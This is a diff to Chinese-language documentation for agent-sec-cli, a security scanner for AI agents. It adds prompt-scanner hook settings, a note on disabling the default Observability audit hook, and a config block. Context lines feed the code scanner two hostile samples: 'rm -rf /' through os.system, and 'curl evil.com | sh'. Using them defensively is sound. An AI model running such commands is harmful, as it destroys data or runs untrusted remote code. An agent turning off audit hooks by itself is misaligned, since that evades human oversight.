@@ -94,6 +94,20 @@ agent-sec-cli scan-prompt warmup
 
 模型来源：ModelScope（Llama-Prompt-Guard-2-86M）。安装后执行 `scan-prompt warmup` 一次以消除冷启动延迟。
 
+#### 宿主 Hook Policy
+
+设置 `PROMPT_SCANNER_HOOK_ENABLED=false` 可完全跳过 prompt scanner hook。启用时，以下环境变量覆盖
+capability 配置：
+
+| 环境变量 | 默认值 | 行为 |
+|----------|--------|------|
+| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | 设为 `false` 时在读取输入前跳过 hook |
+| `PROMPT_SCANNER_MODE` | `observe` | `observe` 静默审计；`warn` 告警；`ask`/`block` 执行或 fallback 为 `warn`；`deny` 等价于 `block` |
+| `PROMPT_SCANNER_SCAN_MODE` | `standard` | 扫描强度：`fast` / `standard` / `strict` |
+| `PROMPT_SCANNER_TIMEOUT` | `10` | Scanner 超时秒数 |
+
+完整 CLI 选项、verdict 语义和 Security Event 说明参见 [Prompt Scanner 用户使用指南](prompt-scanner.md)。
+
 ### Code Scanner（代码扫描）
 
 检测 bash 和 python 代码中的危险操作。判定枚举：`pass` / `warn` / `deny` / `error`；当前内置规则产生 `warn` 或 `pass`。
@@ -108,6 +122,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 # 使用 LLM 引擎（需要模型后端）
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
+
+各 Agent 的 hook 环境变量与交互模式支持范围见 [Code Scanner Hook 配置](code-scanner.md)。
 
 ### Skill Ledger（技能账本）
 
@@ -233,6 +249,19 @@ agent-sec-cli harden --downstream-help
 
 交互式事件审阅工具，用于审计 Agent 行为。
 
+OpenClaw、Hermes、cosh、Qwen Code、Qoder 和 Codex 集成默认启用 Observability hook。
+若需停止 hook 记录，请在启动宿主前设置 `OBSERVABILITY_HOOK_ENABLED=false`；修改后需重启
+宿主进程。该变量仅接受 `true` / `false`（忽略大小写和首尾空白）；未设置或值无效时保持
+默认开启。
+
+对于 OpenClaw 和 Hermes，原有 Observability capability 的 `enabled` 配置仍是独立开关。
+任一开关关闭都会停止记录；`OBSERVABILITY_HOOK_ENABLED=true` 不会覆盖插件配置中已关闭的
+capability。
+
+```bash
+export OBSERVABILITY_HOOK_ENABLED=false
+```
+
 ```bash
 # 打开交互式 TUI（需要交互终端）
 agent-sec-cli observability review
@@ -328,6 +357,11 @@ enable_block = false    # false=观察模式, true=阻断
 [capabilities.pii-scan-user-input]
 enabled = true
 timeout = 10
+
+[capabilities.prompt-scan-user-input]
+enabled = true
+timeout = 10
+enable_block = false    # false=观察模式, true=阻断
 
 [capabilities.skill-ledger]
 enabled = true
